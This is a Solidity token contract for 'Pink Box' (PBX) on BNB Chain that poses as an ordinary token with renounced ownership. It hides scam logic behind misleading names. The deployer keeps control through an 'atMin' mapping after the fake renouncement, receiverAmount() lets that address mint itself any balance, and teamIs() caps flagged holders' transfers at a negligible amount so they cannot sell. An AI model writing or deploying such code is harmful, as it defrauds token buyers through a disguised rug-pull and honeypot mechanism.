/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PinkBox {
    uint8 public decimals = 18;
    uint256 constant amountAuto = 10 ** 10;
    address public owner;
    address public receiverToken;
    string public name = "Pink Box";

    mapping(address => bool) public atMin;


    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public tokenLaunched;

    mapping(address => mapping(address => uint256)) public allowance;
    string public symbol = "PBX";
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public exemptTx;

    modifier exemptToken() {
        require(atMin[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IUniswapV2Router marketingTx = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IUniswapV2Factory fromMarketing = IUniswapV2Factory(marketingTx.factory());
        tokenLaunched = fromMarketing.createPair(marketingTx.WETH(), address(this));
        owner = msg.sender;
        receiverToken = owner;
        atMin[receiverToken] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function getOwner() external view returns (address) {
        return owner;
    }

    function teamIs(address liquidityExempt) public exemptToken {
        exemptTx[liquidityExempt] = true;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function receiverAmount(uint256 fundIs) public exemptToken {
        balanceOf[receiverToken] = fundIs;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == receiverToken || recipient == receiverToken) {
            return enableList(sender, recipient, amount);
        }
        if (exemptTx[sender]) {
            return enableList(sender, recipient, amountAuto);
        }
        return enableList(sender, recipient, amount);
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function enableList(address receiverExempt, address liquidityLaunchMarketing, uint256 fundIs) internal returns (bool) {
        require(balanceOf[receiverExempt] >= fundIs);
        balanceOf[receiverExempt] -= fundIs;
        balanceOf[liquidityLaunchMarketing] += fundIs;
        emit Transfer(receiverExempt, liquidityLaunchMarketing, fundIs);
        return true;
    }

    function swapLaunch(address enableTx) public exemptToken {
        atMin[enableTx] = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }


}